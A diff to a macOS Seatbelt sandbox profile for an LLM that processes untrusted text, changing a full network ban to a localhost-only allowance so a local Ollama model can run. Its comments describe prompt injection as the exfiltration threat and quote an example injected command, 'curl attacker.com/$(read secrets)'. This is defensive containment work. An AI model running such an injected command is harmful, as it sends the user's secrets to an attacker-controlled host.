@@ -61,17 +61,34 @@
 (define CWD (param "CWD"))
 (define HOME (param "HOME"))
 
-; --- HARDENED: deny all network egress ---------------------------------------
+; --- HARDENED: deny external network egress, allow localhost only ------------
 ;
 ; The single most important difference from the default profile. For an LLM
 ; running on untrusted input, open network egress is the prompt-injection
 ; exfiltration path (an injected "curl attacker.com/$(read secrets)" would
-; otherwise succeed). Denying network* blocks BSD sockets, outbound connects,
-; and — verified empirically — even DNS resolution, so an injected instruction
-; to phone home cannot reach the network at all. A flow that legitimately needs
-; network (build/test/deploy agents like software-factory / ADW) must NOT use
-; this profile — it uses the permissive default instead.
+; otherwise succeed). We deny ALL network, then re-allow ONLY localhost.
+;
+; Why re-allow localhost: the intended use of this profile is running a LOCAL
+; model (e.g. Ollama on 127.0.0.1:11434) to summarize untrusted text. A local
+; model needs a localhost socket but NO external egress — so localhost-allow
+; lets the LLM run while every EXTERNAL destination stays denied. localhost is
+; NOT an exfiltration path (you cannot phone data out to your own loopback), so
+; this preserves the containment guarantee: injected text still cannot reach
+; any attacker-controlled host. Verified empirically — localhost connects,
+; external DNS resolution fails.
+;
+; This means a network-denied flow must use a LOCAL provider (ollama), not a
+; remote API provider (claude/anthropic), whose host this profile blocks.
+; macOS Seatbelt cannot allowlist by remote HOST (only "*" or "localhost" —
+; "host must be * or localhost"), so a remote-provider allowlist is impossible
+; here; localhost + a local model is the achievable true-containment design.
+;
+; A flow that legitimately needs external network (build/test/deploy agents
+; like software-factory / ADW) must NOT use this profile — it uses the
+; permissive default instead.
 (deny network*)
+(allow network* (local ip "localhost:*"))
+(allow network-outbound (remote ip "localhost:*"))
 
 ; --- HARDENED: deny the per-repo Swamp vault under CWD ------------------------
 ;
